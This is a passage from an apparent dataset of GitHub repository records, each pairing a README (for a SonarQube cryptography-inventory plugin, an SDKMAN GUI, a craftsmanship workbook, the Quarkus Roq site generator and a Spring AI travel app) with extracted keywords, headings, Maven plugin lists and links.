'attribute', 'entity', 'sent', 'allow', 'event', 'techno', 'rabbitmq', 'apache', 'pulsar', 'contributing', 'getting', 'started', 'project', 'would', 'highly', 'appreciate', 'contribution', 'license', 'distributed', 'mit', 'license', 'see', 'license', 'information']","['event', 'entity', 'sent', 'jpa', 'kafka']",3,0,0,"['feature', 'get', 'start', 'prerequisite', 'installation', 'configuration', 'usage', 'faq', 'roadmap', 'contribute', 'license']",10,"['feature', 'get', 'start', 'prerequisite', 'installation']",3,15.0,1.0,"[maven-deploy-plugin,maven-javadoc-plugin,maven-source-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.jacoco:jacoco-maven-plugin]",0.0,1.0,0.0,2775,43.55555555555556,5.252551020408164,"['x', ' ', ' ', ' ']",4
IBM/sonar-cryptography,main,"# Sonar Cryptography Plugin (CBOMkit-hyperion)

[![License](https://img.shields.io/github/license/IBM/sonar-cryptography.svg?)](https://opensource.org/licenses/Apache-2.0) <!--- long-description-skip-begin -->
[![Current Release](https://img.shields.io/github/release/IBM/sonar-cryptography.svg?logo=IBM)](https://github.com/IBM/sonar-cryptography/releases)


This repository contains a SonarQube Plugin that detects cryptographic assets 
in source code and generates [CBOM](https://cyclonedx.org/capabilities/cbom/).
It is part of **the [CBOMKit](https://github.com/IBM/cbomkit) toolset**.

## Version compatibility

| Plugin Version | SonarQube Version      |
|----------------|------------------------|
| 1.3.2 and up   | SonarQube 9.8 and up   | 
| 1.2.0 to 1.3.1 | SonarQube 9.8 and 10.4 |      


## Supported languages and libraries

| Language | Cryptographic Library                                                                         | Coverage | 
|----------|-----------------------------------------------------------------------------------------------|----------|
| Java     | [JCA](https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html) | 100%     |
|          | [BouncyCastle](https://github.com/bcgit/bc-java) (*light-weight API*)                         | 100%[^1] |
| Python   | [pyca/cryptography](https://cryptography.io/en/latest/)                                       | 100%     |


[^1]: We only cover the BouncyCastle *light-weight API* according to [this specification](https://javadoc.io/static/org.bouncycastle/bctls-jdk14/1.75/specifications.html)

> [!NOTE]
> The plugin is designed in a modular way so that it can be extended to support additional languages and recognition rules to support more libraries.
> - To add support for another language or cryptography library, see [*Extending the Sonar Cryptography Plugin to add support for another language or cryptography library*](./docs/LANGUAGE_SUPPORT.md)
> - If you just want to know more about the syntax for writing new detection rules, see [*Writing new detection rules for the Sonar Cryptography Plugin*](./docs/DETECTION_RULE_STRUCTURE.md)

## Installation

> [!NOTE] 
> To run the plugin, you need a running SonarQube instance with one of the supported 
> versions. If you don't have one but want to try the plugin, you can use the
> included Docker Compose to set up a development environment. See 
> [here](CONTRIBUTING.md#build) for instructions.

Copy the plugin (the JAR file from the [latest releases](https://github.com/IBM/sonar-cryptography/releases))
to `$SONARQUBE_HOME/extensions/plugins` and restart 
SonarQube ([more](https://docs.sonarqube.org/latest/setup-and-upgrade/install-a-plugin/)).

## Using

The plugin provides new inventory rules (IBM Cryptography Repository) regarding the use of cryptography for 
the supported languages.
If you enable these rules, a source code scan creates a cryptographic inventory by creating a 
[CBOM](https://cyclonedx.org/capabilities/cbom/) with all cryptographic assets and writing 
a `cbom.json` to the scan directory.

### Add Cryptography Rules to your Quality Profile

This plugin incorporates rules specifically focused on cryptography.

> To generate a Cryptography Bill of Materials (CBOM), it is mandatory to activate at 
> least one of these cryptography-related rules.

![Activate Rules Crypto Rules](docs/images/rules.png)

As of the current version, the plugin contains one single rule for creating a cryptographic inventory. 
Future updates may introduce additional rules to expand functionality.

### Scan Source Code

Now you can follow the [SonarQube documentation](https://docs.sonarqube.org/latest/analyzing-source-code/overview/) 
to start your first scan.

### Visualizing your CBOM

Once you have scanned your source code with the plugin, and obtained a `cbom.json` file, you can use [IBM's CBOM Viewer](https://www.zurich.ibm.com/cbom/) service to know more about it.
It provides you with general insights about the cryptography used in your source code and its compliance with post-quantum safety.
It also allows you to explore precisely each cryptography asset and its detailed specification, and displays where it appears in your code.

## Help and troubleshooting

If you encounter difficulties or unexpected results while installing the plugin with SonarQube, or when trying to scan a repository, please check out our guide [*Testing your configuration and troubleshooting*](docs/TROUBLESHOOTING.md) to run our plugin with step-by-step instructions.

## Contribution Guidelines

If you'd like to contribute to Sonar Cryptography Plugin, please take a look at our
[contribution guidelines](CONTRIBUTING.md). By participating, you are expected to uphold our [code of conduct](CODE_OF_CONDUCT.md).

We use [GitHub issues](https://github.com/IBM/sonar-cryptography/issues) for tracking requests and bugs. For questions
start a discussion using [GitHub Discussions](https://github.com/IBM/sonar-cryptography/discussions).

## License

[Apache License 2.0](LICENSE.txt)









",8,11,16,apache-2.0,84.0,"['sonar', 'cryptography', 'plugin', 'repository', 'contains', 'sonarqube', 'plugin', 'detects', 'cryptographic', 'asset', 'source', 'code', 'generates', 'cbom', 'part', 'cbomkit', 'toolset', 'version', 'compatibility', 'plugin', 'version', 'sonarqube', 'version', 'sonarqube', 'sonarqube', 'supported', 'language', 'library', 'language', 'cryptographic', 'library', 'coverage', 'java', 'jca', 'bouncycastle', 'api', 'python', 'cover', 'bouncycastle', 'api', 'according', 'specification', 'note', 'plugin', 'designed', 'modular', 'way', 'extended', 'support', 'additional', 'language', 'recognition', 'rule', 'support', 'library', 'add', 'support', 'another', 'language', 'cryptography', 'library', 'see', 'extending', 'sonar', 'cryptography', 'plugin', 'add', 'support', 'another', 'language', 'cryptography', 'library', 'want', 'know', 'syntax', 'writing', 'new', 'detection', 'rule', 'see', 'writing', 'new', 'detection', 'rule', 'sonar', 'cryptography', 'plugin', 'installation', 'note', 'run', 'plugin', 'need', 'running', 'sonarqube', 'instance', 'one', 'supported', 'version', 'one', 'want', 'try', 'plugin', 'use', 'included', 'docker', 'compose', 'set', 'development', 'environment', 'see', 'instruction', 'copy', 'plugin', 'jar', 'file', 'latest', 'release', 'restart', 'sonarqube', 'using', 'plugin', 'provides', 'new', 'inventory', 'rule', 'ibm', 'cryptography', 'repository', 'regarding', 'use', 'cryptography', 'supported', 'language', 'enable', 'rule', 'source', 'code', 'scan', 'creates', 'cryptographic', 'inventory', 'creating', 'cbom', 'cryptographic', 'asset', 'writing', 'scan', 'directory', 'add', 'cryptography', 'rules', 'quality', 'profile', 'plugin', 'incorporates', 'rule', 'specifically', 'focused', 'cryptography', 'generate', 'cryptography', 'bill', 'material', 'cbom', 'mandatory', 'activate', 'least', 'one', 'rule', 'current', 'version', 'plugin', 'contains', 'one', 'single', 'rule', 'creating', 'cryptographic', 'inventory', 'future', 'update', 'may', 'introduce', 'additional', 'rule', 'expand', 'functionality', 'scan', 'source', 'code', 'follow', 'sonarqube', 'documentation', 'start', 'first', 'scan', 'visualize', 'cbom', 'scanned', 'source', 'code', 'plugin', 'obtained', 'file', 'use', 'ibm', 'cbom', 'viewer', 'service', 'know', 'provides', 'general', 'insight', 'cryptography', 'used', 'source', 'code', 'compliance', 'safety', 'also', 'allows', 'explore', 'precisely', 'cryptography', 'asset', 'detailed', 'specification', 'display', 'appears', 'code', 'help', 'troubleshooting', 'encounter', 'difficulty', 'unexpected', 'result', 'installing', 'plugin', 'sonarqube', 'trying', 'scan', 'repository', 'please', 'check', 'guide', 'testing', 'configuration', 'troubleshooting', 'run', 'plugin', 'instruction', 'contribution', 'guideline', 'like', 'contribute', 'sonar', 'cryptography', 'plugin', 'please', 'take', 'look', 'contribution', 'guideline', 'participating', 'expected', 'uphold', 'code', 'conduct', 'use', 'github', 'issue', 'tracking', 'request', 'bug', 'question', 'start', 'discussion', 'using', 'github', 'discussion', 'license', 'apache', 'license']","['plugin', 'cryptography', 'rule', 'sonarqube', 'code']",0,0,0,"['sonar', 'cryptography', 'plugin', 'version', 'compatibility', 'support', 'language', 'library', 'installation', 'use', 'add', 'cryptography', 'rule', 'quality', 'profile', 'scan', 'source', 'code', 'visualize', 'cbom', 'help', 'troubleshooting', 'contribution', 'guideline', 'license']",11,"['cryptography', 'sonar', 'plugin', 'version', 'compatibility']",0,262.0,10.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.cyclonedx:cyclonedx-maven-plugin,org.sonarsource.sonar-packaging-maven-plugin:sonar-packaging-maven-plugin]",0.0,8.0,1.0,5082,26.653846153846157,5.297258297258297,"['![License -> https://img.shields.io/github/license/IBM/sonar-cryptography.svg?', '![Current Release -> https://img.shields.io/github/release/IBM/sonar-cryptography.svg?logo=IBM', 'CBOM -> https://cyclonedx.org/capabilities/cbom/', 'CBOMKit -> https://github.com/IBM/cbomkit', 'JCA -> https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html', 'BouncyCastle -> https://github.com/bcgit/bc-java', 'pyca/cryptography -> https://cryptography.io/en/latest/', '^1]: We only cover the BouncyCastle *light-weight API* according to [this specification -> https://javadoc.io/static/org.bouncycastle/bctls-jdk14/1.75/specifications.html', 'latest releases -> https://github.com/IBM/sonar-cryptography/releases', 'more -> https://docs.sonarqube.org/latest/setup-and-upgrade/install-a-plugin/', 'CBOM -> https://cyclonedx.org/capabilities/cbom/', 'SonarQube documentation -> https://docs.sonarqube.org/latest/analyzing-source-code/overview/', ""IBM's CBOM Viewer -> https://www.zurich.ibm.com/cbom/"", 'GitHub issues -> https://github.com/IBM/sonar-cryptography/issues', 'GitHub Discussions -> https://github.com/IBM/sonar-cryptography/discussions']",15
jagodevreede/sdkman-ui,main,"# sdkman-ui

This project aims to offer a Graphical User Interface for [SDKMAN](https://sdkman.io/).

> [!NOTE]  
> Primary focus for now is to create a UI for windows, other OS's will come later.
> Also only Java and Maven candidates are available in the first version, other candidates will be added later.

## Screenshots

<p align=""center"">
    <img height=""150"" src=""https://jagodevreede.github.io/sdkman-ui-images/gallery1.png"" />
    <img height=""150"" src=""https://jagodevreede.github.io/sdkman-ui-images/gallery2.png"" />
</p>

## Requirements

tar, unzip and zip should be present on the system. You can install them with your favourite package manager on *inx
systems.

### Windows:

Zip and unzip are bundled with the application, if they are on the path then skdman-ui will use those if not then it
will use the bundled versions:

- tar: no need for tar as it is not used on windows
- zip: [https://gnuwin32.sourceforge.net/packages/zip.htm](https://gnuwin32.sourceforge.net/packages/zip.htm)
  or [direct download](http://downloads.sourceforge.net/gnuwin32/zip-3.0-bin.zip)
- unzip: [https://gnuwin32.sourceforge.net/packages/unzip.htm](https://gnuwin32.sourceforge.net/packages/unzip.htm)
  or [direct download](https://gnuwin32.sourceforge.net/downlinks/unzip-bin-zip.php)

## Available platforms

Some platforms are not yet available as they are not yet setup and/or tested.

| Platform    | Available                                                                                                       | Supported envirmoments |
|-------------|-----------------------------------------------------------------------------------------------------------------|------------------------|
| Windows x86 | [v0.0.3](https://github.com/jagodevreede/sdkman-ui/releases/download/v0.0.3/sdkman-ui-windows_x86_64-0.0.3.zip) | cmd        |
| Linux x86   |                                                                                                                 | bash, zsh              |      
| Linux arm   |                                                                                                                 | bash, zsh              |
| osx x86     |                                                                                                                 | bash, zsh              |
| osx arm     |                                                                                                                 | bash, zsh              |

Early access builds can be found here: [releases/tag/early-access](https://github.com/jagodevreede/sdkman-ui/releases/tag/early-access)

## Install instructions

### Windows

Download the latest version and extract the zip, then run the `sdkman-ui.exe`. And follow on screen instructions. Then
it should be available from the commandline as `sdkui`.

Also see the following [video](https://www.youtube.com/watch?v=oyYtHrihThk)

#### Symlinks

Most versions of Windows do not allow the creation on symlinks by default, SDKMAN UI will work
around that by using copy, however this is a lot slower. You can enable development mode in windows
see [https://learn.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development](https://learn.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development)
for more information.

## build steps:

- `sdk u java 22.1.0.1.r17-gln` or manually install from https://github.com/gluonhq/graal/releases
- `export GRAALVM_HOME=$JAVA_HOME`
- `./mvnw clean install -DskipTests`

Native:

To update native reflections `gluonfx:runagent`
`./mvnw gluonfx:build -f sdkman-ui`

Jlink:

-`./mvnw javafx:jlink -f sdkman-ui`

run with: `./sdkman-ui/target/sdkmanui/bin/launcher`

## Run as developer:

Run the following class:
`io.github.jagodevreede.sdkmanui.Main`

## Design decisions

See [DESIGN_DECISIONS.md](DESIGN_DECISIONS.md)",6,6,7,apache-2.0,7.0,"['project', 'aim', 'offer', 'graphical', 'user', 'interface', 'sdkman', 'note', 'primary', 'focus', 'create', 'ui', 'window', 'o', 'come', 'later', 'also', 'java', 'maven', 'candidate', 'available', 'first', 'version', 'candidate', 'added', 'later', 'screenshots', 'requirements', 'tar', 'unzip', 'zip', 'present', 'system', 'install', 'favourite', 'package', 'manager', 'inx', 'system', 'window', 'zip', 'unzip', 'bundled', 'application', 'path', 'use', 'use', 'bundled', 'version', 'tar', 'need', 'tar', 'used', 'window', 'zip', 'http', 'direct', 'download', 'unzip', 'http', 'direct', 'download', 'available', 'platform', 'platform', 'yet', 'available', 'yet', 'setup', 'tested', 'platform', 'available', 'supported', 'envirmoments', 'window', 'cmd', 'linux', 'bash', 'zsh', 'linux', 'arm', 'bash', 'zsh', 'osx', 'bash', 'zsh', 'osx', 'arm', 'bash', 'zsh', 'early', 'access', 'build', 'found', 'install', 'instruction', 'window', 'download', 'latest', 'version', 'extract', 'zip', 'run', 'follow', 'screen', 'instruction', 'available', 'commandline', 'also', 'see', 'following', 'video', 'symlinks', 'version', 'window', 'allow', 'creation', 'symlinks', 'default', 'sdkman', 'ui', 'work', 'around', 'using', 'copy', 'however', 'lot', 'slower', 'enable', 'development', 'mode', 'window', 'see', 'http', 'information', 'build', 'step', 'manually', 'install', 'http', 'native', 'update', 'native', 'reflection', 'jlink', 'run', 'run', 'developer', 'run', 'following', 'class', 'design', 'decision', 'see']","['window', 'available', 'version', 'zip', 'http']",0,0,0,"['screenshots', 'requirement', 'window', 'available', 'platform', 'install', 'instruction', 'window', 'symlinks', 'build', 'step', 'run', 'developer', 'design', 'decision']",11,"['window', 'screenshots', 'requirement', 'available', 'platform']",0,13.0,4.0,"[com.gluonhq:gluonfx-maven-plugin,com.googlecode.maven-download-plugin:download-maven-plugin,net.revelc.code.formatter:formatter-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-resources-plugin,org.codehaus.mojo:versions-maven-plugin,org.openjfx:javafx-maven-plugin]",0.0,3.0,1.0,3863,39.5,4.860759493670886,"['SDKMAN -> https://sdkman.io/', 'https://gnuwin32.sourceforge.net/packages/zip.htm -> https://gnuwin32.sourceforge.net/packages/zip.htm', 'direct download -> http://downloads.sourceforge.net/gnuwin32/zip-3.0-bin.zip', 'https://gnuwin32.sourceforge.net/packages/unzip.htm -> https://gnuwin32.sourceforge.net/packages/unzip.htm', 'direct download -> https://gnuwin32.sourceforge.net/downlinks/unzip-bin-zip.php', 'v0.0.3 -> https://github.com/jagodevreede/sdkman-ui/releases/download/v0.0.3/sdkman-ui-windows_x86_64-0.0.3.zip', 'releases/tag/early-access -> https://github.com/jagodevreede/sdkman-ui/releases/tag/early-access', 'video -> https://www.youtube.com/watch?v=oyYtHrihThk', 'https://learn.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development -> https://learn.microsoft.com/en-us/windows/apps/get-started/enable-your-device-for-development']",9
advent-of-craft/2024-summer-craft-book,main,"# Summer Craft Book 2024

[![Our Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/E5Z9s9UKTS)
[![Linkedin](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/advent-of-craft)

[![License](https://img.shields.io/github/license/advent-of-craft/2024-summer-craft-book.svg)](https://github.com/advent-of-craft/2024-summer-craft-book/blob/main/LICENSE)

This year, we are launching our version of the summer holiday workbook around `Software Craftsmanship` called the **Summer Craft Book**.

Please, download the PDF of the Summer Craft Book in this repository to get the most out of it.

## One theme a week

Each week, a specific theme is going to be examined. You will have information, theory,  exercises, games and resources to go further. 

Set aside a couple of hours a week to work on the subject. If you happen to have more time, a coding version will be available so you can dig into each exercise a bit longer.

We wouldn't want your craft skills to go to waste !

## About this repository

As with the Advent of Craft edition, the PDF of the Summer Craft Book comes with this github repository. Each exercise and most of the games are in it, so you could use the repository standalone.

We understand you could be busy in the summer and want to just do the practice so don't hesitate to do just that !

![Summer of Craft](docs/img/summer-of-craft.webp)

## The Book
You can grab your copy of our `Summer Craft Book` here:
- [Digital copy](https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link)
- [Printable version](https://drive.google.com/file/d/1yG6ALvJyf3y5LCWF38VlzW7D2APaGZRK/view?usp=sharing)

[![Summer Craft Book](docs/img/cover.webp)](https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link)

### Miro board
Alternatively, you can use the miro board template available [here](https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412) or by using the backup file available [here](https://drive.google.com/file/d/1laWnvAk8AnQ00QlaepzF3hTO2a8UR-Wg/view?usp=sharing).

[![Miro board](docs/img/miro-board.webp)](https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412)

## Summary
- [Week 1: Code Analysis.](/docs/01-code-analysis/week01.md)
- [Week 2: Object Calisthenics.](/docs/02-object-calisthenics/week02.md)
- [Week 3: Command Query Separation.](/docs/03-cqs/week03.md)
- [Week 4: Test Driven Development.](docs/04-tdd/week04.md)
- [Week 5: Accidental Complexity.](docs/05-complexity/week05.md)
- [Week 6: Legacy Code.](docs/06-legacy-code/week06.md)
- [Week 7: Property-based Testing.](docs/07-pbt/week07.md)

## Join us on Discord

To facilitate the communication and share your ideas around the different weeks, we invite you to join our `Discord` by simply clicking [here](https://discord.gg/E5Z9s9UKTS).

[![Discord Advent Of Craft](docs/img/discord.webp)](https://discord.gg/E5Z9s9UKTS)

## Available languages
Here are the supported programming languages: `java`, `C#`, `kotlin`, `typescript`.
",0,0,1,mit,0.0,"['summer', 'craft', 'book', 'year', 'launching', 'version', 'summer', 'holiday', 'workbook', 'around', 'called', 'summer', 'craft', 'book', 'please', 'download', 'pdf', 'summer', 'craft', 'book', 'repository', 'get', 'one', 'theme', 'week', 'week', 'specific', 'theme', 'going', 'examined', 'information', 'theory', 'exercise', 'game', 'resource', 'go', 'set', 'aside', 'couple', 'hour', 'week', 'work', 'subject', 'happen', 'time', 'coding', 'version', 'available', 'dig', 'exercise', 'bit', 'longer', 'would', 'want', 'craft', 'skill', 'go', 'waste', 'repository', 'advent', 'craft', 'edition', 'pdf', 'summer', 'craft', 'book', 'come', 'github', 'repository', 'exercise', 'game', 'could', 'use', 'repository', 'standalone', 'understand', 'could', 'busy', 'summer', 'want', 'practice', 'hesitate', 'book', 'grab', 'copy', 'digital', 'copy', 'printable', 'version', 'miro', 'board', 'alternatively', 'use', 'miro', 'board', 'template', 'available', 'using', 'backup', 'file', 'available', 'summary', 'week', 'code', 'analysis', 'week', 'object', 'calisthenics', 'week', 'command', 'query', 'separation', 'week', 'test', 'driven', 'development', 'week', 'accidental', 'complexity', 'week', 'legacy', 'code', 'week', 'testing', 'join', 'u', 'discord', 'facilitate', 'communication', 'share', 'idea', 'around', 'different', 'week', 'invite', 'join', 'simply', 'clicking', 'available', 'language', 'supported', 'programming', 'language']","['week', 'summer', 'craft', 'book', 'repository']",0,0,0,"['summer', 'craft', 'book', 'one', 'theme', 'week', 'about', 'repository', 'the', 'book', 'miro', 'board', 'summary', 'join', 'u', 'discord', 'available', 'language']",8,"['book', 'summer', 'craft', 'one', 'theme']",0,22.0,26.0,"[maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,24.0,2.0,3158,18.296296296296298,4.894736842105263,"['![Our Discord -> https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white', '![Linkedin -> https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white', '![License -> https://img.shields.io/github/license/advent-of-craft/2024-summer-craft-book.svg', 'Digital copy -> https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link', 'Printable version -> https://drive.google.com/file/d/1yG6ALvJyf3y5LCWF38VlzW7D2APaGZRK/view?usp=sharing', '![Summer Craft Book](docs/img/cover.webp) -> https://drive.google.com/file/d/16BrF17jEMr6Sleonnq6xSafWMHA5_q1Y/view?usp=drive_link', 'here -> https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412', 'here -> https://drive.google.com/file/d/1laWnvAk8AnQ00QlaepzF3hTO2a8UR-Wg/view?usp=sharing', '![Miro board](docs/img/miro-board.webp) -> https://miro.com/app/board/uXjVK056f4o=/?share_link_id=201408685412', 'here -> https://discord.gg/E5Z9s9UKTS', '![Discord Advent Of Craft](docs/img/discord.webp) -> https://discord.gg/E5Z9s9UKTS']",11
quarkiverse/quarkus-roq,main,"
<div align=""center"">
  
<img src=""https://github.com/quarkiverse/quarkus-roq/assets/2223984/0eb6642e-8dd3-4def-abb7-f63062ae755b"" width=""400"" >



# Quarkus Roq

<table>
  <tr>
    <td valign=""top"" >
  
<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/badge/all_contributors-9-orange.svg?style=flat-square)](#contributors-)
<!-- ALL-CONTRIBUTORS-BADGE:END -->
</td>
<td valign=""top"">

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.roq/quarkus-roq?logo=apache-maven&style=flat-square)](https://central.sonatype.com/artifact/io.quarkiverse.roq/quarkus-roq-project-parent)
</td>
</tr>
</table>
</div>
</div>


The Roq Static Site Generator extension allows to easily create a static website or blog (such as [Roq's blog](https://pages.quarkiverse.io/quarkus-roq/)) using Quarkus super-powers.

Get started with the [documentation](https://docs.quarkiverse.io/quarkus-roq/dev/index.html).

Roq already includes a set of extensions which can also be used standalone:
- [Roq Data](https://docs.quarkiverse.io/quarkus-roq/dev/quarkus-roq-data.html): Use json/yaml files content from your templates and articles with type safety.
- [Roq FrontMatter](https://docs.quarkiverse.io/quarkus-roq/dev/quarkus-roq-frontmatter.html):  Create a website from your Markdown/Asciidoc/Html pages using FrontMatter headers (url, layout, seo, data).
- [Roq Generator](https://docs.quarkiverse.io/quarkus-roq/dev/quarkus-roq-generator.html): Command to run any Quarkus web application and extract it in a directory as purely static files (html and assets).



## Contributors ✨

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/ia3andy""><img src=""https://avatars.githubusercontent.com/u/2223984?v=4?s=100"" width=""100px;"" alt=""Andy Damevin""/><br /><sub><b>Andy Damevin</b></sub></a><br /><a href=""#maintenance-ia3andy"" title=""Maintenance"">🚧</a> <a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=ia3andy"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://matheuscruz.dev""><img src=""https://avatars.githubusercontent.com/u/56329339?v=4?s=100"" width=""100px;"" alt=""Matheus Cruz""/><br /><sub><b>Matheus Cruz</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=mcruzdev"" title=""Code"">💻</a> <a href=""#ideas-mcruzdev"" title=""Ideas, Planning, & Feedback"">🤔</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://melloware.com""><img src=""https://avatars.githubusercontent.com/u/4399574?v=4?s=100"" width=""100px;"" alt=""Melloware""/><br /><sub><b>Melloware</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=melloware"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://xam.dk""><img src=""https://avatars.githubusercontent.com/u/54129?v=4?s=100"" width=""100px;"" alt=""Max Rydahl Andersen""/><br /><sub><b>Max Rydahl Andersen</b></sub></a><br /><a href=""#ideas-maxandersen"" title=""Ideas, Planning, & Feedback"">🤔</a> <a href=""https://github.com/quarkiverse/quarkus-roq/issues?q=author%3Amaxandersen"" title=""Bug reports"">🐛</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://hollycummins.com""><img src=""https://avatars.githubusercontent.com/u/11509290?v=4?s=100"" width=""100px;"" alt=""Holly Cummins""/><br /><sub><b>Holly Cummins</b></sub></a><br /><a href=""#ideas-holly-cummins"" title=""Ideas, Planning, & Feedback"">🤔</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""http://blog.nerdin.ch""><img src=""https://avatars.githubusercontent.com/u/51133?v=4?s=100"" width=""100px;"" alt=""Erik Jan de Wit""/><br /><sub><b>Erik Jan de Wit</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=edewit"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/jtama""><img src=""https://avatars.githubusercontent.com/u/39991688?v=4?s=100"" width=""100px;"" alt=""Jérôme Tama""/><br /><sub><b>Jérôme Tama</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=jtama"" title=""Code"">💻</a></td>
    </tr>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/RayzaAnchayhua""><img src=""https://avatars.githubusercontent.com/u/93015921?v=4?s=100"" width=""100px;"" alt=""Rayza Luana""/><br /><sub><b>Rayza Luana</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=RayzaAnchayhua"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/mkouba""><img src=""https://avatars.githubusercontent.com/u/913004?v=4?s=100"" width=""100px;"" alt=""Martin Kouba""/><br /><sub><b>Martin Kouba</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-roq/commits?author=mkouba"" title=""Code"">💻</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
",6,22,2,apache-2.0,138.0,"['quarkus', 'roq', 'roq', 'static', 'site', 'generator', 'extension', 'allows', 'easily', 'create', 'static', 'website', 'blog', 'roq', 'blog', 'using', 'quarkus', 'get', 'started', 'documentation', 'roq', 'already', 'includes', 'set', 'extension', 'also', 'used', 'standalone', 'roq', 'data', 'use', 'file', 'content', 'template', 'article', 'type', 'safety', 'roq', 'frontmatter', 'create', 'website', 'page', 'using', 'frontmatter', 'header', 'url', 'layout', 'seo', 'data', 'roq', 'generator', 'command', 'run', 'quarkus', 'web', 'application', 'extract', 'directory', 'purely', 'static', 'file', 'html', 'asset', 'contributor', 'thanks', 'go', 'wonderful', 'people', 'emoji', 'key', 'project', 'follows', 'specification', 'contribution', 'kind', 'welcome']","['roq', 'quarkus', 'static', 'generator', 'extension']",0,0,0,"['quarkus', 'roq', 'contributor']",2,"['quarkus', 'roq', 'contributor']",0,40.0,33.0,"[${quarkus.platform.group-id}:quarkus-maven-plugin,com.coderplus.maven.plugins:copy-rename-maven-plugin,io.mvnpm:esbuild-maven-plugin,io.quarkus:quarkus-config-doc-maven-plugin,io.quarkus:quarkus-extension-maven-plugin,io.quarkus:quarkus-maven-plugin,io.smallrye:jandex-maven-plugin,it.ozimov:yaml-properties-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-jar-plugin,maven-resources-plugin,maven-surefire-plugin,org.asciidoctor:asciidoctor-maven-plugin]",0.0,22.0,11.0,5448,92.0,4.5772946859903385,"['![All Contributors -> https://img.shields.io/badge/all_contributors-9-orange.svg?style=flat-square', '![Version -> https://img.shields.io/maven-central/v/io.quarkiverse.roq/quarkus-roq?logo=apache-maven&style=flat-square', ""Roq's blog -> https://pages.quarkiverse.io/quarkus-roq/"", 'documentation -> https://docs.quarkiverse.io/quarkus-roq/dev/index.html', 'Roq Data -> https://docs.quarkiverse.io/quarkus-roq/dev/quarkus-roq-data.html', 'Roq FrontMatter -> https://docs.quarkiverse.io/quarkus-roq/dev/quarkus-roq-frontmatter.html', 'Roq Generator -> https://docs.quarkiverse.io/quarkus-roq/dev/quarkus-roq-generator.html', 'emoji key -> https://allcontributors.org/docs/en/emoji-key', 'all-contributors -> https://github.com/all-contributors/all-contributors']",9
alina-yur/native-spring-ai,main,"# Native Spring AI

This is a travel recommendation service built with Spring AI, OpeAI, and GraalVM. The base is a regular Spring app, and the integration with OpenAI is implemented in `RecommendationService`. Note that the app is using `OPENAI_API_KEY`.

## Build a native app with GraalVM:

```shell
mvn -Pnative native:compile
```

## Start the app and navigate to the travel request form:

```shell
./target/travelapp
http://localhost:8080/
```

After submitting your preferences, you'll get a generated recommendation – for example:

```
Here is your travel recommendation!💁‍♀️

Destination suggestion: Zurich, Switzerland Zurich is not only known for its stunning views and picturesque landscapes, but it also offers a vibrant nightlife scene with plenty of cocktail bars and lounges to explore. As an adventurous traveler, you can immerse yourself in the city's energetic atmosphere and try out unique and creative cocktails at trendy bars. During the day, you can also take advantage of Zurich's outdoor activities such as hiking in the nearby mountains or cruising on Lake Zurich. And for the ultimate adventure, you can even try paragliding or skydiving for a truly unforgettable experience.

Enjoy your trip!👋
